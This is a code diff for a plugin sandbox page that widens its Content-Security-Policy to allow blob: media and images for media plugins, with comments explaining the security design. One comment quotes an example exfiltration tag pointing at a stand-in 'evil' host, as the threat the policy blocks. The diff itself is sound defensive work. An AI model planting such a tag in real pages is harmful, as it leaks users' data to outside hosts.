@@ -3,18 +3,27 @@
   <head>
     <meta charset="utf-8" />
     <!--
-      Lock the sandbox down further than the iframe `sandbox` attribute alone:
-      `connect-src 'none'` means a plugin cannot fetch/XHR/WebSocket/sendBeacon on
-      its own, so it can't silently phone data home. Its ONLY network path is the
-      host-mediated `app.web.get`, which the host gates behind user consent for
-      untrusted (externally-loaded) plugins. `script-src` still allows the inline
-      runtime below and the plugin's `blob:` module import; everything else is off.
+      MEDIA sandbox (#139). Identical to plugin-host.html EXCEPT the CSP is widened
+      just enough to let a qualitative-coding workspace RENDER host-provided media:
+        - `media-src blob:` lets an <audio>/<video> load a blob: URL.
+        - `img-src blob:`   lets an <img> (image coding, video poster) load one too.
+      Both are `blob:` ONLY — deliberately NOT `https:`/`data:` in these directives:
+      `<img src="https://evil/?leak">` is a covert-GET exfiltration channel, so allowing
+      a remote scheme here would undo the `connect-src 'none'` "no phone-home" guarantee.
+      The plugin never fetches: it calls `app.media.load(ref)`, the host reads the bytes
+      from the content-addressed media store and posts back a Blob, and the plugin turns
+      that into a same-origin blob: URL inside this realm. So a media plugin gains the
+      ability to DISPLAY host-vetted bytes, not any new reach. Used ONLY for plugins that
+      declare `manifest.media === true`.
+
+      KEEP IN SYNC with plugin-host.html — only the CSP above and the `media` namespace
+      in makeApp should differ.
     -->
     <meta
       http-equiv="Content-Security-Policy"
-      content="default-src 'none'; script-src 'unsafe-inline' blob:; connect-src 'none'"
+      content="default-src 'none'; script-src 'unsafe-inline' blob:; connect-src 'none'; media-src blob:; img-src blob:"
     />
-    <title>CrossTab plugin sandbox</title>
+    <title>CrossTab media sandbox</title>
   </head>
   <body>
     <!--
@@ -72,15 +81,15 @@
               return;
             } catch (e) {
               canTransfer = false;
-              try { console.warn('[plugin-host] transfer refused, cloning instead:', e && e.message); } catch {}
+              try { console.warn('[media-host] transfer refused, cloning instead:', e && e.message); } catch {}
             }
           }
           try {
             parentWin.postMessage(msg, '*');
           } catch (e) {
             const detail = diagnoseClone(msg);
-            try { console.error('[plugin-host] clone post failed:', e && e.message, detail); } catch {}
-            throw new Error(`plugin→host post failed [${m.method || m.t}]: ${(e && e.message) || e} — ${detail}`);
+            try { console.error('[media-host] clone post failed:', e && e.message, detail); } catch {}
+            throw new Error(`media→host post failed [${m.method || m.t}]: ${(e && e.message) || e} — ${detail}`);
           }
         };
 
@@ -187,8 +196,9 @@
             // Codec plugins (#98): streaming format read/write. Live only during a
             // codec invocation; no-op host-side otherwise.
             codec: makeNamespace('codec', ['size', 'sourceFile', 'read', 'begin', 'batch', 'writeChunk', 'loadAsset']),
-            // Media plugins (#139): resolve an `asset:`/`data:` ref to a Blob. Only the
-            // media sandbox (plugin-host-media.html) can render it; harmless elsewhere.
+            // Media plugins (#139): resolve an `asset:`/`data:` ref to a Blob the plugin
+            // renders (this sandbox's CSP allows blob: media/images). Host-mediated —
+            // the plugin never touches the media store.
             media: makeNamespace('media', ['load']),
           });
         }
